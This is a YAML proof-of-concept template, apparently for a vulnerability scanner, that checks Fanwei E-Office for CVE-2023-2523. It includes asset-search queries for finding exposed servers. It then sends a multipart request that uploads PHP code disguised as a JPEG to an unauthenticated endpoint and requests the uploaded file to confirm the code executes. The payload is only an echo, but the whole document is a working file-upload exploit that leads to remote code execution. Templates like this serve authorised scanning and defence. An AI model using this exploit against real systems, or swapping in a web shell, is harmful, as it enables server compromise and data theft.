detail:
  author: 
  links:
    - x
  vulnerability:
    level: critical
    fofa-query: app="泛微-EOffice"
    hunter-query: app.name=="泛微 e-office OA"
    quake-query: app:"泛微 E-Office"
    zoomeye-query: app:"泛微协同办公标准产品EOffice"
    threatbook-query: 
    cve: 
    cnvd: 

name: poc-yaml-fanwei-e-office-ajax-upload-CVE-2023-2523
transport: http
set:
  s1: randomLowercase(8)
  s2: randomInt(10000,99999)
rules:
  r0:
    request:
      method: POST
      path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
      follow_redirects: false
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
        Connection: close
      body: |
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="upload_quwan"; filename="{{s1}}.phP"
        Content-Type: image/jpeg
        
        <?php echo {{s1}}?>
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream
        
        ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
    expression: >-
      response.status == 200 && response.body_string.contains(string(s1))

    output:
      search: |-
        "(?P<token>\\d{2,})".bsubmatch(response.body)
      token: search["token"]
  r1:
    request:
      method: GET
      path: /attachment/{{token}}/{{s1}}.php
      follow_redirects: false
      headers: 
      body: 
    expression: >-
      response.status == 200 && response.body_string.contains(string(s1))

expression: r0() && r1()
